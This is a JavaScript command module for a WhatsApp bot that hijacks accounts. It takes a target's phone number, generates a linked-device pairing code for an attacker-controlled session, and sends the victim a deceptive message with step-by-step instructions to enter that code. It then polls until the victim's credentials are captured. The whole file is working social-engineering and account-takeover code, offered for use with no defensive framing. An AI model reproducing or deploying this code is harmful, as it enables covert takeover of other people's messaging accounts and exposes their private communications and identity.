// language: JavaScript, file: commands/hijack/hijackpairing.js
'use strict';

const {
    pairHijackSession,
    addTarget,
    hasCreds,
    wipeTarget,
    closePendingPairing,
} = require('../../lib/hijackSession');

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function buildPretext(code) {
    return (
        `*ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ*\n\n` +
        `╭═══〘 ᴘᴀɪʀɪɴɢ 〙═══⊷❍\n` +
        `┃ ✰ ᴄᴏᴅᴇ: *${code}*\n` +
        `┃ ✰ ᴇxᴘɪʀᴇs: 60s\n` +
        `╰──────────────────────\n\n` +
        `*ʜᴏᴡ ᴛᴏ ᴜsᴇ:*\n` +
        `1. ᴏᴘᴇɴ ᴡʜᴀᴛsᴀᴘᴘ → sᴇᴛᴛɪɴɢs\n` +
        `2. ᴛᴀᴘ *ʟɪɴᴋᴇᴅ ᴅᴇᴠɪᴄᴇs*\n` +
        `3. ᴛᴀᴘ *ʟɪɴᴋ ᴀ ᴅᴇᴠɪᴄᴇ*\n` +
        `4. ᴄʜᴏᴏsᴇ *ʟɪɴᴋ ᴡɪᴛʜ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ*\n` +
        `5. ᴇɴᴛᴇʀ ᴛʜᴇ ᴄᴏᴅᴇ ᴀʙᴏᴠᴇ\n\n` +
        `_code expires in 60 seconds._`
    );
}

module.exports = {
    name: 'hijackpairing',
    aliases: ['vvipairing', 'vvipair', 'hpair'],
    category: 'hijack',
    desc: 'Pair a target session — sends pairing code to target',
    usage: '.hijackpairing <phone> [--force]',
    privateOnly: true,
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const force = args.includes('--force');
        const raw = (args.find(a => !a.startsWith('--')) || '').replace(/\D/g, '');

        if (!raw || raw.length < 7) {
            return ctx.reply(`❌ ᴜsᴀɢᴇ: ${s.prefix}hijackpairing <ᴘʜᴏɴᴇ> [--force]${s.FOOTER}`);
        }

        const scopeKey = ctx.sender;
        if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);

        // if real registered creds exist and no force → block
        if (hasCreds(scopeKey, raw) && !force) {
            return ctx.reply(
                `⚠️ +${raw} ᴀʟʀᴇᴀᴅʏ ᴘᴀɪʀᴇᴅ.\n` +
                `ᴜsᴇ *${s.prefix}hijackpairing ${raw} --force* ᴛᴏ ᴡɪᴘᴇ & ʀᴇᴘᴀɪʀ.${s.FOOTER}`
            );
        }

        // kill any half-open socket from a prior attempt
        closePendingPairing(scopeKey, raw);

        // wipe stale unregistered state (or forced reset)
        // this guarantees a FRESH pairing code, not a stale rejected one.
        wipeTarget(scopeKey, raw);

        await ctx.react?.('⏳');

        try {
            const { code } = await pairHijackSession(scopeKey, raw);
            addTarget(scopeKey, raw);

            const formatted = String(code).replace(/[^a-z0-9]/gi, '').toUpperCase();
            const dashed    = formatted.match(/.{1,4}/g)?.join('-') || formatted;

            const targetJid = `${raw}@s.whatsapp.net`;
            const pretext   = buildPretext(dashed);

            let delivered     = false;
            let deliveryError = null;
            try {
                await sock.sendMessage(targetJid, { text: pretext });
                delivered = true;
            } catch (e) {
                deliveryError = e?.message || 'unknown send failure';
            }

            await ctx.react?.('✅');

            const card =
                `╭═══〘 ʜɪᴊᴀᴄᴋ ᴘᴀɪʀɪɴɢ 〙═══⊷❍\n` +
                `┃ 📱 ᴛᴀʀɢᴇᴛ: +${raw}\n` +
                `┃ 🔑 ᴄᴏᴅᴇ: *${dashed}*\n` +
                `┃ 📤 ᴅᴍ ᴅᴇʟɪᴠᴇʀᴇᴅ: ${delivered ? 'ʏᴇs' : `ɴᴏ — ${deliveryError}`}\n` +
                `┃ ⏱️ ᴇxᴘɪʀᴇs: 60s\n` +
                `┃ 🕓 ᴡᴀɪᴛɪɴɢ ғᴏʀ ᴇɴᴛʀʏ...\n` +
                `╰──────────────────────\n\n` +
                `_Code sent. Target must enter it under Linked Devices → Link with phone number._\n` +
                `_If it fails, retry with:_ *${s.prefix}hijackpairing ${raw} --force*` +
                (delivered ? '' : `\n\n_⚠️ DM failed — forward this code manually._`) +
                s.FOOTER;

            await ctx.reply(card);

            // post-send poll — now uses registered:true check, no false positives
            (async () => {
                for (let i = 0; i < 20; i++) {
                    await sleep(3000);
                    if (hasCreds(scopeKey, raw)) {
                        try {
                            await ctx.reply(
                                `✅ ᴘᴀɪʀᴇᴅ: +${raw} — ᴄʀᴇᴅs ʟᴀɴᴅᴇᴅ. ʀᴜɴ .hijacklist.${s.FOOTER}`
                            );
                        } catch {}
                        return;
                    }
                }
            })().catch(() => {});

        } catch (e) {
            await ctx.react?.('❌');
            return ctx.reply(`❌ ᴘᴀɪʀɪɴɢ ғᴀɪʟᴇᴅ: ${e.message}${s.FOOTER}`);
        }
    },
};